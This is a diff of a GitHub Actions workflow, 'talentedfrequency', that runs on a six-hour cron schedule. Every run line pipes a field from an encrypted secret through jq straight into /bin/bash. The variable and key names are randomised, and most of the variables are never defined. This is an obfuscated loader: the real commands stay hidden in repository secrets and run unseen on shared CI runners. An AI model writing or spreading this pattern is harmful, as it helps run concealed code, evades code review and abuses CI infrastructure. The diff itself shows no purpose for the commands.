@@ -1,29 +1,22 @@
 name: talentedfrequency
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
-
+    - cron: '32 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: talentedfrequency
         env:
-          lu07: ${{ secrets.lu07 }}
+          t9: ${{ secrets.t9 }}
         run: |
-          echo $lu07 | jq -r .dnlg5 | /bin/bash
-          echo $r744 | jq -r .vzd4741 | /bin/bash
-          echo $mwk52469 | jq -r .gnv3245 | /bin/bash
-          echo $qi90499 | jq -r .u4397 | /bin/bash
-          echo $vvbcg19 | jq -r .dtp2 | /bin/bash
-          echo $xjci66558 | jq -r .tdtv71 | /bin/bash
-          echo $eioju63062 | jq -r .si69043 | /bin/bash
-          echo $qt4 | jq -r .yrakd95357 | /bin/bash
-          echo $saze3940 | jq -r .dmy4 | /bin/bash
-          echo $s93783 | jq -r .b58 | /bin/bash
-          echo $zb594 | jq -r .zz83764 | /bin/bash
-          echo $igk5162 | jq -r .qv828 | /bin/bash
+          echo $t9 | jq -r .ih7800 | /bin/bash
+          echo $bhkk9 | jq -r .orgd7790 | /bin/bash
+          echo $mhenx8812 | jq -r .w3 | /bin/bash
+          echo $w3102 | jq -r .ahqh70 | /bin/bash
+          echo $tj4 | jq -r .nloz1973 | /bin/bash
+          echo $navh73 | jq -r .nk91 | /bin/bash
 
